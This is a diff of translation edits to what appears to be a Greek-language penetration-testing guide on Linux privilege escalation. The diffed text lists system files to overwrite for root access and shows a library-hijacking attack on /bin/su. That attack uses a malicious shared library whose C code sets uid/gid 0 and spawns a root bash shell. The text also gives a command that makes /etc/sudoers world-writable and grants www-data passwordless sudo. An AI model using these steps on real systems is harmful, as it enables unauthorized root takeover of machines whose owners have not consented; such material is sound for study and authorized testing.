@@ -44,18 +44,18 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## Υπερεγγραφή ενός αρχείου για κλιμάκωση προνομίων
+## Αντικατάσταση ενός αρχείου για κλιμάκωση προνομίων
 
 ### Συνήθη αρχεία
 
 - Προσθήκη χρήστη με κωδικό πρόσβασης στο _/etc/passwd_
 - Αλλαγή κωδικού πρόσβασης μέσα στο _/etc/shadow_
 - Προσθήκη χρήστη στους sudoers στο _/etc/sudoers_
-- Abuse του docker μέσω του docker socket, συνήθως στο _/run/docker.sock_ ή _/var/run/docker.sock_
+- Εκμετάλλευση του docker μέσω του docker socket, συνήθως στο _/run/docker.sock_ ή στο _/var/run/docker.sock_
 
-### Υπερεγγραφή μιας βιβλιοθήκης
+### Αντικατάσταση μιας βιβλιοθήκης
 
-Ελέγξτε μια βιβλιοθήκη που χρησιμοποιείται από κάποιο binary, σε αυτήν την περίπτωση το `/bin/su`:
+Ελέγξτε μια βιβλιοθήκη που χρησιμοποιείται από κάποιο binary, σε αυτή την περίπτωση το `/bin/su`:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -67,8 +67,8 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-Σε αυτή την περίπτωση, ας προσπαθήσουμε να προσποιηθούμε ότι είμαστε το `/lib/x86_64-linux-gnu/libaudit.so.1`.\
-Επομένως, ελέγξτε τις συναρτήσεις αυτής της βιβλιοθήκης που χρησιμοποιούνται από το δυαδικό **`su`**:
+Σε αυτή την περίπτωση, ας προσπαθήσουμε να impersonate το `/lib/x86_64-linux-gnu/libaudit.so.1`.\
+Επομένως, ελέγξτε τις functions αυτής της library που χρησιμοποιούνται από το **`su`** binary:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Τα σύμβολα `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` και `audit_fd` πιθανότατα προέρχονται από τη βιβλιοθήκη libaudit.so.1. Καθώς η libaudit.so.1 θα αντικατασταθεί από τη κακόβουλη shared library, αυτά τα σύμβολα θα πρέπει να υπάρχουν στη νέα shared library· διαφορετικά, το πρόγραμμα δεν θα μπορέσει να εντοπίσει το σύμβολο και θα τερματιστεί.
+Τα σύμβολα `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` και `audit_fd` πιθανότατα προέρχονται από τη βιβλιοθήκη libaudit.so.1. Καθώς η libaudit.so.1 θα αντικατασταθεί από τη malicious shared library, αυτά τα σύμβολα θα πρέπει να υπάρχουν στη νέα shared library· διαφορετικά, το πρόγραμμα δεν θα μπορεί να βρει το σύμβολο και θα τερματιστεί.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -98,13 +98,13 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Τώρα, απλώς καλώντας το **`/bin/su`**, θα αποκτήσετε ένα shell ως root.
+Τώρα, απλώς καλώντας το **`/bin/su`**, θα αποκτήσεις ένα shell ως root.
 
 ## Scripts
 
-Μπορείτε να κάνετε το root να εκτελέσει κάτι;
+Μπορείς να κάνεις το root να εκτελέσει κάτι;
 
-### **www-data σε sudoers**
+### **www-data to sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
